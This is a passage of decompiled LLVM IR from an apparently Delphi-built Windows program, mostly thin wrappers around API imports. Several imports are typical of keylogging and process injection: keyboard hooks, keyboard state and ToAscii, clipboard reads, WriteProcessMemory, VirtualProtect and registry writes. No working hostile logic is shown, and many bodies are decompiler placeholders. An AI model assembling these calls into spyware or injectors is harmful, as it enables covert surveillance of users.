dec_label_pc_4036ee:                              ; preds = %dec_label_pc_4036e8
  store i32 %5, i32* %3, align 4, !insn.addr !85
  br label %dec_label_pc_4036f2, !insn.addr !85

dec_label_pc_4036f2:                              ; preds = %dec_label_pc_4036ee, %dec_label_pc_4036e8, %dec_label_pc_4036e4
  ret i32 %0, !insn.addr !86
}

define i32 @function_4036f4() local_unnamed_addr {
dec_label_pc_4036f4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !87
  %spec.select = select i1 %1, i32 4208377, i32 %0
  ret i32 %spec.select, !insn.addr !88
}

declare i32 @InternalUniqueString() local_unnamed_addr

define i32 @UniqueString() local_unnamed_addr {
dec_label_pc_403744:
  %0 = call i32 @InternalUniqueString(), !insn.addr !89
  ret i32 %0, !insn.addr !89
}

define i32 @function_403749() local_unnamed_addr {
dec_label_pc_403749:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !90
}

define i32 @function_40374c() local_unnamed_addr {
dec_label_pc_40374c:
  %0 = call i32 @InternalUniqueString(), !insn.addr !91
  ret i32 %0, !insn.addr !91
}

define i32 @function_403751() local_unnamed_addr {
dec_label_pc_403751:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !92
}

declare i32 @"@LStrCopy"() local_unnamed_addr

define i32 @function_403793() local_unnamed_addr {
dec_label_pc_403793:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !93
}

declare i32 @"@LStrDelete"() local_unnamed_addr

declare i32 @"@LStrInsert"() local_unnamed_addr

declare i32 @"@LStrPos"() local_unnamed_addr

declare i32 @"@LStrSetLength"() local_unnamed_addr

define i32 @function_4038eb() local_unnamed_addr {
dec_label_pc_4038eb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !94
}

define i32 @function_403997() local_unnamed_addr {
dec_label_pc_403997:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !95
}

declare i32 @"@FinalizeArray"() local_unnamed_addr

define i32 @function_403a9b() local_unnamed_addr {
dec_label_pc_403a9b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !96
}

define i32 @function_403caa() local_unnamed_addr {
dec_label_pc_403caa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !97
}

define i32 @function_403cb3() local_unnamed_addr {
dec_label_pc_403cb3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !98
}

define i32 @function_403cb4() local_unnamed_addr {
dec_label_pc_403cb4:
  %eax.0.reg2mem = alloca i32, !insn.addr !99
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !99
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !100
  br i1 %1, label %dec_label_pc_403cbb, label %dec_label_pc_403cb8, !insn.addr !100

dec_label_pc_403cb8:                              ; preds = %dec_label_pc_403cb4
  %2 = add i32 %0, -4, !insn.addr !101
  %3 = inttoptr i32 %2 to i32*, !insn.addr !101
  %4 = load i32, i32* %3, align 4, !insn.addr !101
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !101
  br label %dec_label_pc_403cbb, !insn.addr !101

dec_label_pc_403cbb:                              ; preds = %dec_label_pc_403cb8, %dec_label_pc_403cb4
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !102
}

define i32 @function_403cbc() local_unnamed_addr {
dec_label_pc_403cbc:
  %0 = call i32 @function_403cb4(), !insn.addr !103
  %1 = add i32 %0, -1, !insn.addr !104
  ret i32 %1, !insn.addr !105
}

define i32 @FinalizeArray() local_unnamed_addr {
dec_label_pc_403cd4:
  %0 = call i32 @"@FinalizeArray"(), !insn.addr !106
  ret i32 %0, !insn.addr !106
}

define i32 @function_403cd9() local_unnamed_addr {
dec_label_pc_403cd9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !107
}

define i32 @DynArrayClear() local_unnamed_addr {
dec_label_pc_403cdc:
  %0 = call i32 @"@DynArrayClear"(), !insn.addr !108
  ret i32 %0, !insn.addr !109
}

declare i32 @"@DynArraySetLength"() local_unnamed_addr

declare i32 @"@DynArrayClear"() local_unnamed_addr

declare i32 @RegisterModule() local_unnamed_addr

define i32 @UnregisterModule.47() local_unnamed_addr {
dec_label_pc_403fb0:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !110
  ret i32 %0, !insn.addr !110
}

define i32 @function_403fb5() local_unnamed_addr {
dec_label_pc_403fb5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !111
}

define i32 @function_403fb7(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403fb7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !112
}

define i32 @LCIDToCodePage.48() local_unnamed_addr {
dec_label_pc_404066:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !113
  ret i32 %0, !insn.addr !113
}

define i32 @function_40406b() local_unnamed_addr {
dec_label_pc_40406b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !114
}

define i32 @function_40406d(i32 %arg1) local_unnamed_addr {
dec_label_pc_40406d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !115
}

define i32 @Finalization.49() local_unnamed_addr {
dec_label_pc_4040be:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !116
  ret i32 %0, !insn.addr !116
}

define i32 @function_4040c3() local_unnamed_addr {
dec_label_pc_4040c3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !117
}

define i32 @function_4040c5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4040c5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !118
}

define i32 @LocalAlloc.24() local_unnamed_addr {
dec_label_pc_40419c:
  %0 = call i32 @LocalAlloc.3(), !insn.addr !119
  ret i32 %0, !insn.addr !119
}

define i32 @LocalFree.38() local_unnamed_addr {
dec_label_pc_4041a4:
  %0 = call i32 @LocalFree.2(), !insn.addr !120
  ret i32 %0, !insn.addr !120
}

define i32 @TlsAlloc.37() local_unnamed_addr {
dec_label_pc_4041ac:
  %0 = call i32 @TlsAlloc(), !insn.addr !121
  ret i32 %0, !insn.addr !121
}

define i1 @TlsFree.39(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_4041b4:
  %0 = call i1 @TlsFree(i32 %dwTlsIndex), !insn.addr !122
  ret i1 %0, !insn.addr !122
}

define i32* @TlsGetValue.22(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_4041bc:
  %0 = call i32* @TlsGetValue(i32 %dwTlsIndex), !insn.addr !123
  ret i32* %0, !insn.addr !123
}

define i1 @TlsSetValue.23(i32 %dwTlsIndex, i32* %lpTlsValue) local_unnamed_addr {
dec_label_pc_4041c4:
  %0 = call i1 @TlsSetValue(i32 %dwTlsIndex, i32* %lpTlsValue), !insn.addr !124
  ret i1 %0, !insn.addr !124
}

define i32 @GetTlsSize() local_unnamed_addr {
dec_label_pc_4041d8:
  ret i32 8, !insn.addr !125
}

define i32 @InitializeModule() local_unnamed_addr {
dec_label_pc_4042dc:
  %0 = call i32 @RegisterModule(), !insn.addr !126
  ret i32 %0, !insn.addr !127
}

declare i32 @"@InitLib"(i32) local_unnamed_addr

define i32 @function_404330() local_unnamed_addr {
dec_label_pc_404330:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !128
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !128
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !128
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !129
  %2 = load i32, i32* @global_var_409658, align 4, !insn.addr !130
  %3 = add i32 %2, 1, !insn.addr !130
  store i32 %3, i32* @global_var_409658, align 4, !insn.addr !130
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !131
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !132
  ret i32 0, !insn.addr !133
}

define i32 @function_404355() local_unnamed_addr {
dec_label_pc_404355:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !134
  ret i32 %0, !insn.addr !134
}

define i32 @function_40435a() local_unnamed_addr {
dec_label_pc_40435a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !135
}

define i32 @function_40435c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40435c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !136
}

define i32 @function_404360() local_unnamed_addr {
dec_label_pc_404360:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409658, align 4, !insn.addr !137
  %2 = add i32 %1, -1, !insn.addr !137
  store i32 %2, i32* @global_var_409658, align 4, !insn.addr !137
  ret i32 %0, !insn.addr !138
}

define i32 @function_404368() local_unnamed_addr {
dec_label_pc_404368:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !139
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !139
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !139
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !140
  %2 = load i32, i32* @global_var_409660, align 4, !insn.addr !141
  %3 = add i32 %2, 1, !insn.addr !141
  store i32 %3, i32* @global_var_409660, align 4, !insn.addr !141
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !142
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !143
  ret i32 0, !insn.addr !144
}

define i32 @function_40438d() local_unnamed_addr {
dec_label_pc_40438d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !145
  ret i32 %0, !insn.addr !145
}

define i32 @function_404392() local_unnamed_addr {
dec_label_pc_404392:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !146
}

define i32 @function_404394(i32 %arg1) local_unnamed_addr {
dec_label_pc_404394:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !147
}

define i32 @function_404398() local_unnamed_addr {
dec_label_pc_404398:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409660, align 4, !insn.addr !148
  %2 = add i32 %1, -1, !insn.addr !148
  store i32 %2, i32* @global_var_409660, align 4, !insn.addr !148
  ret i32 %0, !insn.addr !149
}

define i32 @function_4043a0() local_unnamed_addr {
dec_label_pc_4043a0:
  %0 = call i32 @RegCloseKey.6(), !insn.addr !150
  ret i32 %0, !insn.addr !150
}

define i32 @function_4043a8(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition) local_unnamed_addr {
dec_label_pc_4043a8:
  %0 = call i32 @RegCreateKeyExA(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition), !insn.addr !151
  ret i32 %0, !insn.addr !151
}

define i32 @function_4043b0(i32* %hKey, i8* %lpSubKey) local_unnamed_addr {
dec_label_pc_4043b0:
  %0 = call i32 @RegDeleteKeyA(i32* %hKey, i8* %lpSubKey), !insn.addr !152
  ret i32 %0, !insn.addr !152
}

define i32 @function_4043b8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4043b8:
  %0 = call i32 @RegOpenKeyExA.5(), !insn.addr !153
  ret i32 %0, !insn.addr !153
}

define i32 @function_4043c0(i32 %arg1, i32* %arg2, i32* %arg3, i32* %arg4, i32 %arg5, i8* %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_4043c0:
  %0 = call i32 @RegQueryValueExA.4(), !insn.addr !154
  ret i32 %0, !insn.addr !154
}

define i32 @function_4043c8(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData) local_unnamed_addr {
dec_label_pc_4043c8:
  %0 = call i32 @RegSetValueExA(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData), !insn.addr !155
  ret i32 %0, !insn.addr !155
}

define i1 @function_4043d0(i32* %hObject) local_unnamed_addr {
dec_label_pc_4043d0:
  %0 = call i1 @CloseHandle(i32* %hObject), !insn.addr !156
  ret i1 %0, !insn.addr !156
}

define i32 @function_4043d8(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2) local_unnamed_addr {
dec_label_pc_4043d8:
  %0 = call i32 @CompareStringA(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2), !insn.addr !157
  ret i32 %0, !insn.addr !157
}

define i1 @function_4043e0(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists) local_unnamed_addr {
dec_label_pc_4043e0:
  %0 = call i1 @CopyFileA(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists), !insn.addr !158
  ret i1 %0, !insn.addr !158
}

define i32* @function_4043e8(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile) local_unnamed_addr {
dec_label_pc_4043e8:
  %0 = call i32* @CreateFileA(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile), !insn.addr !159
  ret i32* %0, !insn.addr !159
}

define i32* @function_4043f0(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId) local_unnamed_addr {
dec_label_pc_4043f0:
  %0 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId), !insn.addr !160
  ret i32* %0, !insn.addr !160
}

define i1 @function_4043f8(i8* %lpFileName) local_unnamed_addr {
dec_label_pc_4043f8:
  %0 = call i1 @DeleteFileA(i8* %lpFileName), !insn.addr !161
  ret i1 %0, !insn.addr !161
}

define i32 @function_404400(i32 %arg1) local_unnamed_addr {
dec_label_pc_404400:
  %0 = call i32 @ExitProcess.9(), !insn.addr !162
  ret i32 %0, !insn.addr !162
}

define i32* @function_404408(i32* %hModule, i8* %lpName, i8* %lpType) local_unnamed_addr {
dec_label_pc_404408:
  %0 = call i32* @FindResourceA(i32* %hModule, i8* %lpName, i8* %lpType), !insn.addr !163
  ret i32* %0, !insn.addr !163
}

define void @function_404410(i32* %hLibModule, i32 %dwExitCode) local_unnamed_addr {
dec_label_pc_404410:
  call void @FreeLibraryAndExitThread(i32* %hLibModule, i32 %dwExitCode), !insn.addr !164
  ret void, !insn.addr !164
}

define i32* @function_404418() local_unnamed_addr {
dec_label_pc_404418:
  %0 = call i32* @GetCurrentProcess(), !insn.addr !165
  ret i32* %0, !insn.addr !165
}

define i32 @function_404420(i32* %hFile, i32* %lpFileSizeHigh) local_unnamed_addr {
dec_label_pc_404420:
  %0 = call i32 @GetFileSize(i32* %hFile, i32* %lpFileSizeHigh), !insn.addr !166
  ret i32 %0, !insn.addr !166
}

define i32 @function_404428(i32* %hModule, i8* %lpFilename, i32 %nSize) local_unnamed_addr {
dec_label_pc_404428:
  %0 = call i32 @GetModuleFileNameA(i32* %hModule, i8* %lpFilename, i32 %nSize), !insn.addr !167
  ret i32 %0, !insn.addr !167
}

define i32* @function_404430(i8* %lpModuleName) local_unnamed_addr {
dec_label_pc_404430:
  %0 = call i32* @GetModuleHandleA(i8* %lpModuleName), !insn.addr !168
  ret i32* %0, !insn.addr !168
}

define i32 ()* @function_404438(i32* %hModule, i8* %lpProcName) local_unnamed_addr {
dec_label_pc_404438:
  %0 = call i32 ()* @GetProcAddress(i32* %hModule, i8* %lpProcName), !insn.addr !169
  ret i32 ()* %0, !insn.addr !169
}

define i32 @function_404440(i32 %nBufferLength, i8* %lpBuffer) local_unnamed_addr {
dec_label_pc_404440:
  %0 = call i32 @GetTempPathA(i32 %nBufferLength, i8* %lpBuffer), !insn.addr !170
  ret i32 %0, !insn.addr !170
}

define i32 @function_404448() local_unnamed_addr {
dec_label_pc_404448:
  %0 = call i32 @GetTickCount.8(), !insn.addr !171
  ret i32 %0, !insn.addr !171
}

define i32* @function_404450(i32 %uFlags, i32 %dwBytes) local_unnamed_addr {
dec_label_pc_404450:
  %0 = call i32* @GlobalAlloc(i32 %uFlags, i32 %dwBytes), !insn.addr !172
  ret i32* %0, !insn.addr !172
}

define i32* @function_404458(i32* %hMem) local_unnamed_addr {
dec_label_pc_404458:
  %0 = call i32* @GlobalFree(i32* %hMem), !insn.addr !173
  ret i32* %0, !insn.addr !173
}

define i32* @function_404460(i32* %hMem) local_unnamed_addr {
dec_label_pc_404460:
  %0 = call i32* @GlobalLock(i32* %hMem), !insn.addr !174
  ret i32* %0, !insn.addr !174
}

define i1 @function_404468(i32* %hMem) local_unnamed_addr {
dec_label_pc_404468:
  %0 = call i1 @GlobalUnlock(i32* %hMem), !insn.addr !175
  ret i1 %0, !insn.addr !175
}

define i32* @function_404470(i8* %lpLibFileName) local_unnamed_addr {
dec_label_pc_404470:
  %0 = call i32* @LoadLibraryA(i8* %lpLibFileName), !insn.addr !176
  ret i32* %0, !insn.addr !176
}

define i1 @function_404478(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_404478:
  %0 = call i1 @ReadFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped), !insn.addr !177
  ret i1 %0, !insn.addr !177
}

define i1 @function_404480(i32* %hFile) local_unnamed_addr {
dec_label_pc_404480:
  %0 = call i1 @SetEndOfFile(i32* %hFile), !insn.addr !178
  ret i1 %0, !insn.addr !178
}

define void @function_404488(i32 %dwMilliseconds) local_unnamed_addr {
dec_label_pc_404488:
  call void @Sleep(i32 %dwMilliseconds), !insn.addr !179
  ret void, !insn.addr !179
}

define i1 @function_404490(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect) local_unnamed_addr {
dec_label_pc_404490:
  %0 = call i1 @VirtualProtect(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect), !insn.addr !180
  ret i1 %0, !insn.addr !180
}

define i32 @function_404498() local_unnamed_addr {
dec_label_pc_404498:
  %0 = call i32 @WriteFile.7(), !insn.addr !181
  ret i32 %0, !insn.addr !181
}

define i1 @function_4044a0(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten) local_unnamed_addr {
dec_label_pc_4044a0:
  %0 = call i1 @WriteProcessMemory(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten), !insn.addr !182
  ret i1 %0, !insn.addr !182
}

define i32 @function_4044a8(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_4044a8:
  %0 = call i32 @lstrcmpiA(i8* %lpString1, i8* %lpString2), !insn.addr !183
  ret i32 %0, !insn.addr !183
}

define i8* @function_4044b0(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_4044b0:
  %0 = call i8* @lstrcpyA(i8* %lpString1, i8* %lpString2), !insn.addr !184
  ret i8* %0, !insn.addr !184
}

define i1 @function_4044b8(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer) local_unnamed_addr {
dec_label_pc_4044b8:
  %0 = call i1 @GetCharWidthA(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer), !insn.addr !185
  ret i1 %0, !insn.addr !185
}

define i32* @function_4044c0(i32 %i) local_unnamed_addr {
dec_label_pc_4044c0:
  %0 = call i32* @GetStockObject(i32 %i), !insn.addr !186
  ret i32* %0, !insn.addr !186
}

define i32* @function_4044c8(i32* %hdc, i32* %h) local_unnamed_addr {
dec_label_pc_4044c8:
  %0 = call i32* @SelectObject(i32* %hdc, i32* %h), !insn.addr !187
  ret i32* %0, !insn.addr !187
}

define i32 @function_4044d0(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044d0:
  %0 = call i32 @CallNextHookEx(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam), !insn.addr !188
  ret i32 %0, !insn.addr !188
}

define i1 @function_4044d8() local_unnamed_addr {
dec_label_pc_4044d8:
  %0 = call i1 @CloseClipboard(), !insn.addr !189
  ret i1 %0, !insn.addr !189
}

define i32 @function_4044e0(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044e0:
  %0 = call i32 @DefWindowProcA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !190
  ret i32 %0, !insn.addr !190
}

define i32 @function_4044e8(%tagMSG* %lpMsg) local_unnamed_addr {
dec_label_pc_4044e8:
  %0 = call i32 @DispatchMessageA(%tagMSG* %lpMsg), !insn.addr !191
  ret i32 %0, !insn.addr !191
}

define i1 @function_4044f0(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044f0:
  %0 = call i1 @EnumWindows(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam), !insn.addr !192
  ret i1 %0, !insn.addr !192
}

define i32* @function_4044f8(i8* %lpClassName, i8* %lpWindowName) local_unnamed_addr {
dec_label_pc_4044f8:
  %0 = call i32* @FindWindowA(i8* %lpClassName, i8* %lpWindowName), !insn.addr !193
  ret i32* %0, !insn.addr !193
}

define i32* @function_404500(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow) local_unnamed_addr {
dec_label_pc_404500:
  %0 = call i32* @FindWindowExA(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow), !insn.addr !194
  ret i32* %0, !insn.addr !194
}

define i1 @function_404508(%tagPOINT* %lpPoint) local_unnamed_addr {
dec_label_pc_404508:
  %0 = call i1 @GetCaretPos(%tagPOINT* %lpPoint), !insn.addr !195
  ret i1 %0, !insn.addr !195
}

define i32 @function_404510(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_404510:
  %0 = call i32 @GetClassLongA(i32* %hWnd, i32 %nIndex), !insn.addr !196
  ret i32 %0, !insn.addr !196
}

define i32 @function_404518(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount) local_unnamed_addr {
dec_label_pc_404518:
  %0 = call i32 @GetClassNameA(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount), !insn.addr !197
  ret i32 %0, !insn.addr !197
}

define i32* @function_404520(i32 %uFormat) local_unnamed_addr {
dec_label_pc_404520:
  %0 = call i32* @GetClipboardData(i32 %uFormat), !insn.addr !198
  ret i32* %0, !insn.addr !198
}

define i32* @function_404528(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404528:
  %0 = call i32* @GetDC(i32* %hWnd), !insn.addr !199
  ret i32* %0, !insn.addr !199
}

define i1 @function_404530(i8* %lpKeyState) local_unnamed_addr {
dec_label_pc_404530:
  %0 = call i1 @GetKeyboardState(i8* %lpKeyState), !insn.addr !200
  ret i1 %0, !insn.addr !200
}

define i1 @function_404538(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax) local_unnamed_addr {
dec_label_pc_404538:
  %0 = call i1 @GetMessageA(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax), !insn.addr !201
  ret i1 %0, !insn.addr !201
}

define i32* @function_404540(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404540:
  %0 = call i32* @GetParent(i32* %hWnd), !insn.addr !202
  ret i32* %0, !insn.addr !202
}

define i32* @function_404548(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404548:
  %0 = call i32* @GetTopWindow(i32* %hWnd), !insn.addr !203
  ret i32* %0, !insn.addr !203
}

define i32* @function_404550(i32* %hWnd, i32 %uCmd) local_unnamed_addr {
dec_label_pc_404550:
  %0 = call i32* @GetWindow(i32* %hWnd, i32 %uCmd), !insn.addr !204
  ret i32* %0, !insn.addr !204
}

define i32 @function_404558(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_404558:
  %0 = call i32 @GetWindowLongA(i32* %hWnd, i32 %nIndex), !insn.addr !205
  ret i32 %0, !insn.addr !205
}

define i32 @function_404560(i32* %hWnd, i32* %lpdwProcessId) local_unnamed_addr {
dec_label_pc_404560:
  %0 = call i32 @GetWindowThreadProcessId(i32* %hWnd, i32* %lpdwProcessId), !insn.addr !206
  ret i32 %0, !insn.addr !206
}

define i1 @function_404568(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404568:
  %0 = call i1 @IsWindow(i32* %hWnd), !insn.addr !207
  ret i1 %0, !insn.addr !207
}

define i1 @function_404570(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404570:
  %0 = call i1 @IsWindowVisible(i32* %hWnd), !insn.addr !208
  ret i1 %0, !insn.addr !208
}

define i1 @TObject.AfterConstruction(i32* %hWnd, i32 %uIDEvent) local_unnamed_addr {
dec_label_pc_404578:
  %0 = call i1 @KillTimer(i32* %hWnd, i32 %uIDEvent), !insn.addr !209
  ret i1 %0, !insn.addr !209
}

define i32* @function_404580(i32* %hInstance, i8* %lpIconName) local_unnamed_addr {
dec_label_pc_404580:
  %0 = call i32* @LoadIconA(i32* %hInstance, i8* %lpIconName), !insn.addr !210
  ret i32* %0, !insn.addr !210
}

define i1 @function_404588(i32* %hWndNewOwner) local_unnamed_addr {
dec_label_pc_404588:
  %0 = call i1 @OpenClipboard(i32* %hWndNewOwner), !insn.addr !211
  ret i1 %0, !insn.addr !211
}

define i1 @function_404590(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_404590:
  %0 = call i1 @PostMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !212
  ret i1 %0, !insn.addr !212
}

define void @function_404598(i32 %nExitCode) local_unnamed_addr {
dec_label_pc_404598:
  call void @PostQuitMessage(i32 %nExitCode), !insn.addr !213
  ret void, !insn.addr !213
}

define i32 @function_4045a0(i32* %hWnd, i32* %hDC) local_unnamed_addr {
dec_label_pc_4045a0:
  %0 = call i32 @ReleaseDC(i32* %hWnd, i32* %hDC), !insn.addr !214
  ret i32 %0, !insn.addr !214
}

define i32 @function_4045a8(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4045a8:
  %0 = call i32 @SendMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !215
  ret i32 %0, !insn.addr !215
}

define i32 @function_4045b0(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc) local_unnamed_addr {
dec_label_pc_4045b0:
  %0 = call i32 @SetTimer(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc), !insn.addr !216
  ret i32 %0, !insn.addr !216
}

define i32 @function_4045b8(i32* %hWnd, i32 %nIndex, i32 %dwNewLong) local_unnamed_addr {
dec_label_pc_4045b8:
  %0 = call i32 @SetWindowLongA(i32* %hWnd, i32 %nIndex, i32 %dwNewLong), !insn.addr !217
  ret i32 %0, !insn.addr !217
}

define i32* @function_4045c0(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId) local_unnamed_addr {
dec_label_pc_4045c0:
  %0 = call i32* @SetWindowsHookExA(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId), !insn.addr !218
  ret i32* %0, !insn.addr !218
}

define i32 @function_4045c8(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags) local_unnamed_addr {
dec_label_pc_4045c8:
  %0 = call i32 @ToAscii(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags), !insn.addr !219
  ret i32 %0, !insn.addr !219
}

define i1 @function_4045d0(i32* %hhk) local_unnamed_addr {
dec_label_pc_4045d0:
  %0 = call i1 @UnhookWindowsHookEx(i32* %hhk), !insn.addr !220
  ret i1 %0, !insn.addr !220
}

define i32 @function_4045d8() local_unnamed_addr {
dec_label_pc_4045d8:
  %0 = call i32 @Move(), !insn.addr !221
  ret i32 %0, !insn.addr !222
}

define i32 @_CreateWindowExA() local_unnamed_addr {
dec_label_pc_4045e0:
  %0 = call i32 @CreateWindowExA.10(), !insn.addr !223
  ret i32 %0, !insn.addr !223
}

declare i32* @CreateWindowExA(i32, i8*, i8*, i32, i32, i32, i32, i32, i32*, i32*, i32*, i32*) local_unnamed_addr

define i32 @function_404640() local_unnamed_addr {
dec_label_pc_404640:
